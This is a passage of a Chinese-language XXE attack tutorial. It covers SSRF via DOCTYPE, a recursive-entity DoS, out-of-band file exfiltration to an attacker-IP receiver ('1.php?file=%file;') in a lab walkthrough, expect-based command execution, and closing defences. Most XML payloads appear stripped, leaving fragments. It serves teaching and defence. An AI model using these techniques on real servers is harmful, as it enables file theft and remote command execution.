这个 ssrf 可以值得注意一下，因为对 xml 的攻击中，大都是使用 外部实体引用，那么如果直接加载 xml 的时候，禁止外部实体引用呢？
这种情况下，大多数攻击都会失效，但是 ssrf 不会
别忘了请求外部资源还有一种方式，直接使用 DOCTYPE
**3\. DoS**
任何能大量占用服务器资源的方法都可以造成 DoS，这个的原理就是递归引用
lol 实体具体还有 "lol" 字符串，然后一个 lol2 实体引用了 10 次 lol 实体，一个 lol3 实体引用了 10 次 lol2
实体，此时一个 lol3 实体就含有 10^2 个 "lol" 了，以此类推，lol9 实体含有 10^8 个 "lol" 字符串…
那么，引用 lol9，boom…
**4\. 参数实体**
参数实体，之前在远程文件读取的介绍中，可以绕过文件内容复杂导致解析失败的限制
参数实体以%开头 我们使用参数实体只需要遵循两条原则：
1.参数实体只能在DTD声明中使用。 2.参数实体中不能再引用参数实体。
如图，/etc/fstab 是一个内容复杂的文件，如果直接利用 SYSTEM 请求远程文件会解析出错的，也就是读不到文件内容。
那么就可以使用参数实体进行绕过 xml 严格的语法规则
其实流程很简单：
start 参数实体的内容： 
然后接着定义了一个 dtd 参数实体，使用 SYSTEM 发出获取 combine.dtd 的内容
并且在 DTD 内部引用了 dtd 参数实体，那么这个时候，源文件中的 DTD 应该是这样：
    ">
最后，再由源文件中引用 all 普通实体引发文件读取：
其中这个 CDATA 的意思是为 文件内容添加属性：不被解析的普通字符
这样，参数实体的引用就不需要在xml文档解析的时候保持xml闭合,xml 解释器就会直接忽略文件内容的语法规则，达到了绕过的目的
攻击方ip：
    http://192.168.229.130/
    eval.dtd
    1.php
服务器IP
    http://192.168.229.128/
    2.php
在攻击方的WEB目录上有一个叫做eval.dtd文件用于攻击，然后在服务器上传2.php，执行2.php
报错没关系。
下面看一下代码：
1.php:
简单的接受get参数传的内容然后保存在1.txt下
EVAL.DTD文件的内容为
这里注意使用参数实体时，在引用实体的格式中需要编码用&#X25代替 %，由于嵌套引用外部参数实体，如果直接利用%，在引用的时候会导致找不到该参数实体名称
作用为将接受到外部file实体应用到1.php?file=的%file上
这样在服务器上传来的内容就会传到file参数上然后保存到1.txt上
在2.PHP文件中
第一个ENTITY用于读取服务器本地文件test.txt
第二个用于引用远程dtd文件
然后在实体利用上需要注意顺序，先执行名为dtd实体引用攻击方eval.dtd的代码获得了实体send的执行方式http://192.168.229.130/1.php?file=%file;
然后将file实体获得的内容引用到192.168.229.130/1.php?file
至此攻击完成，攻击方服务器以保存了1.txt
这里提一下前面说过的，在读取文件的时候当存在空格，尖括号的时候这种直接读取内容的方式会报错
显示无效url，抓包时抓不到在浏览器上访问http://192.168.229.130/1.php?file=blessing software的包
结合之前的的协议应用，可以使用常用的php://filter读取base64编码
如下
解码即可。
只是选了几个协议作为例子，这里的协议都能使用。
这里附加几个关于xxe漏洞的英文文档和实例：
 —-Z-BLOG任意文件读取
**5\. 通过 Xinclude 包含外部资源**
基于XInclude的文件包含,使用的另一套 xml 语法约束：XML schema
XInclude提供了一种较为方便的取回数据的思路(再也不用担心数据不完整而导致parser抛出一个错误)而我们能够通过parse属性，强制引用文件的类型。
不过Xinclude需要手动开启，测试发现所有xml parser都默认关闭这一特性。
**PHP 和 JAVA 环境**
**php 支持的扩展协议**
**Java &Xerces**
默认的Oracle's Java Runtime Environment下的XML
parser是Xerces，一个apache的项目。而Xerces和Java提供了一系列的特性，这些特性又能导致一些严重的安全问题。上述的那些攻击手法(DOCTYPEs
for SSRF,文件读取,参数实体的外带数据)在java的默认配置下能够运用自如,java/Xerces也支持XInclude
但是需要setXIncludeAware(true) 和setNamespaceAware(true)。
**php &expect的RCE**
很遗憾，这个扩展并不是默认安装的，然而安装了这个扩展的XXE漏洞，是能够执行任意命令。
    ]>
    &cmd;
还有 python、.net 环境等
**防御**
**1 直接使用开发语言提供的禁用外部实体的方法**
这样其实没法防御 xml 制造的 ssrf
PHP：
    libxml_disable_entity_loader(true);
JAVA:
    DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();
    dbf.setExpandEntityReferences(false);
Python：
    from lxml import etree
    xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))
**2 过滤用户提交的 xml 数据**
敏感关键词： 